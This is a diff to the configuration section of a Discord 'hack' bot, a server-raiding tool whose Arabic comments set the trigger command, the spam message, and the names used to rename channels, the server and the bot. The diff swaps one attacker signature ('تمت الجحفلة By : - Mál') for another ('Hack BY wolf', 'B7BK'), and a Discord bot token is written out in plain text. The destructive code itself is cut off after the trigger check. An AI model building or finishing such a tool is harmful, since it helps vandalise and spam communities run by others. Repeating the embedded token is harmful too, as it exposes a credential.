@@ -3,11 +3,11 @@ const client = new Discord.Client();
 //انا لا اتحمل مسؤولية اي باند يجيك من سيرفر او من دسكورد نفسه
 const Token = "NTc4MjM1NTc4ODczODA2ODcx.XNwqRA.-T7AyUoBo9Ln90YoC0CfWUwNZvw" //هنا توكن البوت اللي بتشغل عليه الهاك
 const x_x = ".2" //هنا تحط الامر اللي يشغل الهاك
-const teext = "تمت الجحفلة By : - Mál" //هنا تحط وش تبي يكون اسم الرومات الكتابيه
-const vooice = "تمت الجحفلة By : - Mál" //هنا تحط وش تبي يكون اسم الرومات الصوتيه
+const teext = "Hack BY wolf" //هنا تحط وش تبي يكون اسم الرومات الكتابيه
+const vooice = "Hack BY wolf" //هنا تحط وش تبي يكون اسم الرومات الصوتيه
 const pic = "https://cdn.discordapp.com/avatars/200644160179535872/5a245f045a43665f00f6b1a7817cc68c.png?size=2048" //هنا تحط رابط الصوره اللي بيحطها البوت بكل مكان
-const spam = "تمت الجحفلة By : - Mál" //هنا تحط وش تبي رسالة السبام
-const namee = "تمت الجحفلة By : - Mál" //هنا تحط وش تبي اسم السيرفر واسم البوت والبلاينق
+const spam = "Hack BY wolf" //هنا تحط وش تبي رسالة السبام
+const namee = "B7BK" //هنا تحط وش تبي اسم السيرفر واسم البوت والبلاينق
 const playing = "Hacked u hhh Malicious" //هنا تحط وش تبي يكون الستريمنق
 client.on('message', message => {
 if (message.content === x_x) {
